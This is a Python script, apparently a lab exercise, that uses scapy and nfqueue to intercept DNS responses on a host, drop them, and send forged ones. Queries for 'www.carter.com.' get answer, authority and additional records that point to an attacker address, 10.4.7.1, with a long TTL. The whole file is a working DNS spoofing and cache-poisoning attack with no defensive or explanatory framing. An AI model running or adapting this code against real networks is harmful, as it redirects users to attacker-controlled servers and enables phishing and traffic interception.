from scapy.all import *
from scapy.layers.inet import IP
import sys
import nfqueue

def change_send(i, p):
	data = p.get_data()
	pckt = IP(data)
	ip = IP()
	udp = UDP()
	proto = pckt.proto
	p.set_verdict(nfqueue.NF_DROP)
	if (proto is 0x11):
		if (pckt[UDP].sport == 53):
			qd = pckt[UDP].payload
			qname = qd[DNSQR].qname
			ip.src = pckt[IP].src
			ip.dst = pckt[IP].dst
			print(ip.src)
			print(ip.dst)
			udp.sport = pckt[UDP].sport
			udp.dport = 2000
			print(udp.dport)
			bombastIP = "10.4.7.1"
			originalIP = qd.an.rdata
			dns = DNS(id = qd.id, qr = 1, qdcount = 1, ancount = 1, arcount = 1, nscount = 1, rcode = 0)
			dns.qd = qd[DNSQR]
			print("rdata: ", originalIP)
			if(qname == "www.carter.com."):
				dns.an = DNSRR(rrname = qd.an.rrname, ttl = 257540, rdlen = 4, rdata = bombastIP)
				dns.ns = DNSRR(rrname = qd.ns.rrname, ttl = 257540, rdlen = 4, rdata = bombastIP)
				dns.ar = DNSRR(rrname = qd.ar.rrname, ttl = 257540, rdlen = 4, rdata = bombastIP)
				send(ip/udp/dns)
			else:
				dns.an = DNSRR(rrname = qname, ttl = 257540, rdlen = 4, rdata = originalIP)
				dns.ns = DNSRR(rrname = qname, ttl = 257540, rdlen = 4, rdata = originalIP)
				dns.ar = DNSRR(rrname = qname, ttl = 257540, rdlen = 4, rdata = originalIP)
				send(ip/udp/dns)
q = nfqueue.queue()
q.open()
q.bind(socket.AF_INET)
q.set_callback(change_send)
q.create_queue(0)
try:
	q.try_run()
except KeyboardInterrupt:
	q.unbind(socket.AF_INET)
	q.close()
